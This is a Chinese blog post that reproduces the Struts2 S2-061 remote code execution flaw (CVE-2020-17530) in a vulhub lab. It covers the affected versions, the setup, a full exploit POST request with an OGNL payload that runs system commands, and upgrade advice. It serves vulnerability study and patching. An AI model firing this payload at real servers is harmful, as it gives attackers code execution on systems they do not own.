# Struts2 S2-061 远程命令执行漏洞复现（CVE-2020-17530） - Gh0st_1n_The_Shell - 博客园

> 原文：[`www.cnblogs.com/Gh0st1nTheShell/p/15337188.html`](https://www.cnblogs.com/Gh0st1nTheShell/p/15337188.html)

## 0x01 漏洞简介

Struts 在某些情况下可能存在 OGNL 表达式注入漏洞，如果开发人员使用了 %{…} 语法进行强制 OGNL 解析，某些特殊的 TAG 属性可能会被双重解析。攻击者可以通过构造恶意的 OGNL 表达式来利用此漏洞，最终造成远程代码执行

## 0x02 漏洞影响

apache：struts2：2.0.0 - 2.5.25

## 0x03 环境搭建

[`github.com/vulhub/vulhub/tree/master/struts2/s2-061`](https://github.com/vulhub/vulhub/tree/master/struts2/s2-061)
下载 docker-compose.yml 后 cd 到文件夹，使用 docker-compose up -d 进行安装，安装完后访问 ip:8080 进入环境，使用 docker-compose down 关闭环境
![在这里插入图片描述](img/710dc1d6bcae33b9bec5467e468e7ea8.png)

## 0x04 漏洞复现

首先先测试一下漏洞是否存在
payload：`?id=%25%7b+%27fuxian%27+%2b+(2000+%2b+21).toString()%7d`
原语句：`%{ 'fuxian' + (2000 + 21).toString()}`
最后可以看到 html 标签 a 的 id 为 fuxian2021，说明 Struts2 将语句给解析了，构成了 RCE
![在这里插入图片描述](img/b801af094834acd462e301036e322f32.png)
exp：

```
POST /index.action HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 829

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- 
```

将数据包使用 burpsuite 的重放器来提交，注意修改 host 的值
![在这里插入图片描述](img/a972a5ae232de4aff3edf3948442bb74.png)
可以看到有输出语句
![在这里插入图片描述](img/1c98c7edfc572c9096eafda9035d929a.png)
通过修改 payload 来执行不同的语句
![在这里插入图片描述](img/d72697ee2f36e4e0c22cfa75c75a08e5.png)

## 0x05 修复建议

避免对不受信任的用户输入使用强制 OGNL 评估，或/和升级到 2.5.26 版，可修复该漏洞。腾讯安全专家建议受影响的用户将 Apache Struts 框架升级至最新版本临时修复，升级到 Struts 2.5.26 版本，下载地址为：
[`cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26`](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26)